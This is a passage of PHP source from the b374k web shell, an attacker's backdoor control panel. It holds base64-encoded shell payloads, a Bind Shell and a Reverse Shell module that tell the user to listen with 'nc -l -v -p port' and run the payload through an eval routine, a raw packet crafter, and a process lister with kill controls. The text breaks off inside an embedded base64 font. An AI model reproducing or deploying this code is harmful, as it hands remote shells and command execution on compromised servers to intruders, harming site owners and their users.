$GLOBALS['resources']['rs_java'] = "lVRNb9swDD2nQP+D4JM9BHaTDdjWIsOwYYcBAzosvXXBICuMrdWWBYnOB9L891Gy7LhrLz1Ekcgn8vGRcpaxElHb6ywrJJZtnoqmzvK37989dOvlhax1Y5D95VueyiZ9c/PUpAC97fJCt3klBRMVt5b5y3+MPV5eTLSRW47ALHIkwEYqXgWYRgZ7BLW27K40wNcOP1z4rnSLSyR7zaS9GbtuWzz7mhY9A3J3HDTGT+9On11IjlhKm0q7oMh+S8aFi3TqQn2+3YIxcg2juNtGrplpVZx4nhM0h24zyQ8I9yuWswVTsGP++GH2cb666fxSIRPkpDyuzDhPgmNXygpi8WlxlbAQa0Is0p2RCHE+vZqKHurtm6q1ZTyYXox58n/dKjiKMv62F6BRNopBcoSUVFSkBRcPd4YLoHAe7Jau+lBv6Jgvu+ZSxaSfVAUVyk1hOxFcZW4cfO7Oz0S9Jl5RlkuV2TLyLrmJlweLUKcF4E/TaDB4iKPGporXECUpNj+aHZiv3BKhVKo17G83cbSTKkqcPMcQlf6ijm/ItnNWP3DMllBV7JqJRikQCOvfqss+6s/OEfhCZxtkXDbiAZCVoXfdMfiGDhN9V3NagSqwXCxmYQQm/iksaFYRCjCp5sYCHTz6/mrV92QJhuYppLJ9qpExdoF6tONiUy5c1/pmd/2EygL7n8z8tWQ64aQmrHfNVqPEIxGknrIRr9PLUrDHR/Yyn/ErLKQru3Tqj8zDKD95oEUzYMf2AUz+/oX0JhopAe6TQhd/tQplDe562NJEwR5ETMOThG8FqUWTOwsFk876GbWpI9IncOj5GV24r4p+znCAz1J6Psa1T8+H7VlGv7ziddLv9A8=";
$GLOBALS['resources']['rs_executable'] = "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"; $GLOBALS['module']['network']['id'] = "network";
$GLOBALS['module']['network']['title'] = "Network";
$GLOBALS['module']['network']['js_ontabselected'] = "";
$GLOBALS['module']['network']['content'] = "
<table class='boxtbl'>
<thead> <tr><th colspan='2'><p class='boxtitle'>Bind Shell</p></th></tr>
</thead>
<tbody> <tr><td style='width:144px'>Server IP</td><td><input type='text' id='bindAddr' value='".$server_addr."' disabled></td></tr> <tr><td>Port</td><td><input type='text' id='bindPort' value='".$default_port."' onkeydown=\"trap_enter(event, 'rs_go_bind');\"></td></tr>
</tbody>
<tfoot> <tr> <td style='width:144px;'> <select id='bindLang' class='rsType'> ".$winbinary." </select> </td> <td><span class='button' onclick=\"rs_go_bind();\" style='width:120px;'>run</span></td> </tr> <tr><td colspan='2'><pre id='bindResult'>Press ' run ' button and run ' nc server_ip port ' on your computer</pre></td></tr>
</tfoot>
</table>
<br>
<table class='boxtbl'>
<thead> <tr><th colspan='2'><p class='boxtitle'>Reverse Shell</p></th></tr>
</thead>
<tbody> <tr><td style='width:144px'>Target IP</td><td><input type='text' id='backAddr' value='".$remote_addr."' onkeydown=\"trap_enter(event, 'rs_go_back');\"></td></tr> <tr><td>Port</td><td><input type='text' id='backPort' value='".$default_port."' onkeydown=\"trap_enter(event, 'rs_go_back');\"></td></tr>
</tbody>
<tfoot> <tr> <td style='width:144px;'> <select id='backLang' class='rsType'> ".$winbinary." </select> </td> <td><span class='button' onclick=\"rs_go('back');\" style='width:120px;'>run</span></td> </tr> <tr><td colspan='2'><pre id='backResult'>Run ' nc -l -v -p port ' on your computer and press ' run ' button</pre></td></tr>
</tfoot>
</table>
<br>
<table class='boxtbl'>
<thead> <tr><th colspan='2'><p class='boxtitle'>Simple Packet Crafter</p></th></tr>
</thead>
<tbody> <tr><td style='width:120px'>Host</td><td><input type='text' id='packetHost' value='tcp://".$server_addr."' onkeydown=\"trap_enter(event, 'packet_go');\"></td></tr> <tr><td>Start Port</td><td><input type='text' id='packetStartPort' value='80' onkeydown=\"trap_enter(event, 'packet_go');\"></td></tr> <tr><td>End Port</td><td><input type='text' id='packetEndPort' value='80' onkeydown=\"trap_enter(event, 'packet_go');\"></td></tr> <tr><td>Connection Timeout</td><td><input type='text' id='packetTimeout' value='5' onkeydown=\"trap_enter(event, 'packet_go');\"></td></tr> <tr><td>Stream Timeout</td><td><input type='text' id='packetSTimeout' value='5' onkeydown=\"trap_enter(event, 'packet_go');\"></td></tr>
</tbody>
<tfoot> <tr><td colspan='2'><textarea id='packetContent' style='height:140px;min-height:140px;'>GET / HTTP/1.1\\r\\n\\r\\n</textarea></td></tr> <tr> <td> <span class='button' onclick=\"packet_go();\" style='width:120px;'>run</span> </td> <td>You can also press ctrl+enter to submit</td> </tr> <tr><td colspan='2'><div id='packetResult'></div></td></tr>
</tfoot>
</table>
"; if(isset($p['rsLang']) && isset($p['rsArgs'])){ $rsLang = $p['rsLang']; $rsArgs = $p['rsArgs']; $res = ""; if($rsLang=="php"){ $code = get_resource("rs_".$rsLang); if($code!==false){ $code = "\$target = \"".$rsArgs."\"; ?>".$code; $res = eval_go($rsLang, $code, "", ""); } } else{ $code = get_resource("rs_".$rsLang); if($code!==false){ $res = eval_go($rsLang, $code, "", $rsArgs); } } if($res===false) $res == "error"; output(html_safe($res));
}
elseif(isset($p['packetTimeout'])&&isset($p['packetSTimeout'])&&isset($p['packetPort'])&&isset($p['packetTimeout'])&&isset($p['packetContent'])){ $packetHost = trim($p['packetHost']); if(!preg_match("/[a-z0-9]+:\/\/.*/", $packetHost)) $packetHost = "tcp://".$packetHost; $packetPort = (int) $p['packetPort']; $packetTimeout = (int) $p['packetTimeout']; $packetSTimeout = (int) $p['packetSTimeout']; $packetContent = $p['packetContent']; if(ctype_xdigit($packetContent)) $packetContent = @pack("H*" , $packetContent); else{ $packetContent = str_replace(array("\r","\n"), "", $packetContent); $packetContent = str_replace(array("\\r","\\n"), array("\r", "\n"), $packetContent); } $res = ""; $sock = fsockopen($packetHost, $packetPort, $errNo, $errStr, $packetTimeout); if(!$sock){ $res .= "<div class='weak'>"; $res .= html_safe(trim($errStr))." (error ".html_safe(trim($errNo)).")</div>"; } else{ stream_set_timeout($sock, $packetSTimeout); fwrite($sock, $packetContent."\r\n\r\n\x00"); $counter = 0; $maxtry = 1; $bin = ""; do{ $line = fgets($sock, 1024); if(trim($line)=="") $counter++; $bin .= $line; }while($counter<$maxtry); fclose($sock); $res .= "<table class='boxtbl'><tr><td><textarea style='height:140px;min-height:140px;'>".html_safe($bin)."</textarea></td></tr>"; $res .= "<tr><td><textarea style='height:140px;min-height:140px;'>".bin2hex($bin)."</textarea></td></tr></table>"; } output($res);
} $GLOBALS['module']['processes']['id'] = "processes";
$GLOBALS['module']['processes']['title'] = "Processes";
$GLOBALS['module']['processes']['js_ontabselected'] = "show_processes();";
$GLOBALS['module']['processes']['content'] = ""; if(!function_exists('show_processes')){ function show_processes(){ $output = ''; $wcount = 11; if(is_win()){ $cmd = "tasklist /V /FO csv"; $wexplode = "\",\""; } else{ $cmd = "ps aux"; $wexplode = " "; } $res = execute($cmd); if(trim($res)=='') return false; else{ $output .= "<table id='psTable' class='dataView sortable'>"; if(!is_win()) $res = preg_replace('#\ +#',' ',$res); $psarr = explode("\n",$res); $fi = true; $tblcount = 0; $check = explode($wexplode,$psarr[0]); $wcount = count($check); foreach($psarr as $psa){ if(trim($psa)!=''){ if($fi){ $fi = false; $psln = explode($wexplode, $psa, $wcount); $output .= "<tr><th class='col-cbox sorttable_nosort'><div class='cBoxAll'></div></th><th class='sorttable_nosort'>action</th>"; foreach($psln as $p) $output .= "<th>".trim(trim(strtolower($p)) ,"\"")."</th>"; $output .= "</tr>"; } else{ $psln = explode($wexplode, $psa, $wcount); $pid = trim(trim($psln[1]),"\""); $tblcount = 0; $output .= "<tr data-pid='".$pid."'>"; foreach($psln as $p){ if(trim($p)=="") $p = " "; $p = trim(trim($p) ,"\""); $p = html_safe($p); if($tblcount == 0){ $output .= "<td><div class='cBox'></div></td><td><a class='kill'>kill</a></td><td>".$p."</td>"; $tblcount++; } else{ $tblcount++; if($tblcount == count($psln)) $output .= "<td style='text-align:left;'>".$p."</td>"; else $output .= "<td style='text-align:center;'>".$p."</td>"; } } $output .= "</tr>"; } } } $colspan = count($psln)+1; $colspanAll = $colspan+1; $output .= "<tfoot><tr><td><div class='cBoxAll'></div></td><td colspan=".$colspan." style='text-align:left;'><span class='button' onclick='kill_selected();' style='margin-right:8px;'>kill selected</span><span class='button' onclick='show_processes();'>refresh</span><span class='psSelected'></span></td></tr></tfoot></table>"; } return $output; }
} if(isset($p['showProcesses'])){ $processes = show_processes(); if($processes!==false) output($processes); output('error');
}
elseif(isset($p['allPid'])){ $allPid = explode(" ", $p['allPid']); $counter = 0; foreach($allPid as $pid){ $pid = trim($pid); if(!empty($pid)){ if(function_exists("posix_kill")){ if(posix_kill($pid,'9')) $counter++; } else{ if(is_win()){ $cmd = execute("taskkill /F /PID ".$pid); $cmd = execute("tasklist /FI \"PID eq ".$pid."\""); if(strpos($cmd,"No tasks are running")!==false) $counter++; } else{ $cmd = execute("kill -9 ".$pid); if((strpos($cmd, "such process")===false)&&(strpos($cmd, "not permitted")===false)){ $cmd = trim(execute("ps -p ".$pid)); $check = explode("\n", $cmd); if(count($check)==1) $counter++; } } } } } if($counter>0) output($counter); else output('error');
} $error = @ob_get_contents();
$error_html = (!empty($error))?"<pre class='phpError border'>".str_replace("\n\n", "\n", html_safe($error))."</pre>":"";
@ob_end_clean();
error_reporting(0);
@ini_set('display_errors','0');?><!doctype html>
<html>
<head>
<title><?php echo $GLOBALS['title']." ".$GLOBALS['ver'];?></title>
<meta charset='utf-8'>
<meta name='robots' content='noindex, nofollow, noarchive'>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, user-scalable=0">
<link rel='SHORTCUT ICON' href='<?php echo get_resource('b374k');?>'>
<style type="text/css">
@font-face {
font-family:'ubuntumono';
src:url(data:application/x-font-woff;charset=utf-8;base64,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